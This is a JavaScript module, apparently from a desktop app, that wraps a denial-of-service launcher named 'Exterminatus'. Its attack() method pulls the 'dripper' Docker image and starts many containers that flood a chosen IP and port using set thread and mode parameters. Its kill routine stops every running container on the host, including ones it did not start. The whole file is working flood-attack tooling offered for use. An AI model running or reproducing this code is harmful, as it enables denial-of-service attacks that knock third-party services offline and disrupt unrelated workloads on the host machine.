const util = require('util');
const { exec, spawn } = require('child_process');
const execAsync = util.promisify(exec);

class Exterminatus {
  async attack({ ip, port, mode, threads, containers }) {
    if (!containers) {
      console.error('Incorrect number of containers');
      return;
    }
    try {
      document.dispatchEvent(new Event('START'));
      console.info('download latest image...');
      await execAsync('docker pull alexmon1989/dripper:latest');
      console.info('latest image downloaded!');
      const queue = [];
      for (let i = containers; i !== 0; i--) {
        const name = `container${i}`;
        const cmd = `run --rm --name ${name} alexmon1989/dripper:latest -s ${ip} -p ${port} -t ${threads} -m ${mode} && sleep 5 &`
        console.info(`preparing to run command: ${cmd}`);
        queue.push(new Promise((res) => {
          setTimeout(() => {
            const docker = spawn('docker', cmd.split(' '));
            docker.stdout.on('data', () => {
              res(name);
            });

            docker.stderr.on('data', (data) => {
              console.error(`stderr: ${data}`);
            });

            docker.on('close', (code) => {
              console.log(`child process exited with code ${code}`);
            });
          }, 1000);
        }));
      }
      console.info('docker creating containers...');
      Promise.all(queue).then(() => {
        document.dispatchEvent(new Event('START_SUCCESS'));
        console.info('all containers are running!');
      }).catch(() => {
        document.dispatchEvent(new Event('START_FAILED'));
      });
    } catch (err) {
      console.error(err);
    }
  }

  async killContainers() {
    const cmd = `docker kill $(docker ps -q) && docker image rm -f alexmon1989/dripper`;
    console.info(`running command: ${cmd}`);
    exec(cmd, (error, stdout) => {
      if (error) {
        console.error(error);
        return;
      }
      console.info(stdout);
    });
    document.dispatchEvent(new Event('STOP'));
  }
}

module.exports.default = new Exterminatus();